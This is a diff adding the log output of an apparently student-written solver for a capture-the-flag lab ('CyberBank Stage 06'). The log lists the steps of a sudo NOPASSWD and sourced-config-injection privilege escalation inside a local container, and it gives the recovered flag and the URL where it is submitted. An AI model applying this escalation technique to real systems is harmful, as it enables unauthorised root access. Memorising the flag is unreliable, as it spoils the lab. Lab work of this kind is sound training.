@@ -1,0 +1,39 @@
+﻿=================================================================
+ CyberBank Stage 06 (BlackVault Server) - Automated Exploit Solver
+ Responsible Member: Kumarasinghe KWTP (IT24102485) - Stages 4-6
+ Exploit Vector: Sudoers NOPASSWD Misconfiguration & Sourced Conf Injection
+=================================================================
+[*] Target Container : cyberbank-blackvault
+[*] Target SSH Host : 127.0.0.1:2222
+[*] Auditor Account : analyst
+[*] Target Flag File: /root/blackvault_flag.txt
+
+[*] Transport Backend Selected: Docker Exec (Local Container)
+[*] Step 1: Enumerating auditor account ('analyst') sudo permissions...
+[+] Sudo privilege confirmed: (root) NOPASSWD: /opt/blackvault/bin/vault_backup.sh
+[*] Step 2: Checking file permissions on configuration file '/etc/blackvault/backup.conf'...
+[+] File ownership & mode: -rw-rw-r-- 1 root analyst 280 Oct 10 07:49 /etc/blackvault/backup.conf
+[*] Step 3: Injecting privilege escalation command into '/etc/blackvault/backup.conf'...
+[+] Command payload successfully appended to /etc/blackvault/backup.conf
+[*] Step 4: Executing privileged routine via 'sudo /opt/blackvault/bin/vault_backup.sh'...
+[*] Step 5: Parsing execution stream for canonical flag format...
+[*] Step 6: Restoring '/etc/blackvault/backup.conf' to clean state...
+[+] Clean state restored on /etc/blackvault/backup.conf. Environment reset.
+
+=================================================================
+[+] SUCCESS: Linux Privilege Escalation Exploit Complete!
+=================================================================
+[+] Recovered Stage 06 Master Flag: CBANK{LINUX_r00t_bl4ckv4ult_m4st3r_5519}
+
+[*] Sudo Backup Execution Output Preview:
+--------------------------------------------------
+    [*] Initializing BlackVault System Snapshot...
+    [*] Sourcing configuration from /etc/blackvault/backup.conf...
+    CBANK{LINUX_r00t_bl4ckv4ult_m4st3r_5519}
+    [+] BlackVault snapshot archive created in /var/backups/blackvault.
+    [+] Snapshot routine completed.
+--------------------------------------------------
+
+[NOTE] Member 3 Verification Complete:
+Submit this final flag at http://localhost:5000/challenges/stage/6
+to achieve 100% completion (1,000 / 1,000 PTS) on Operation BlackVault!
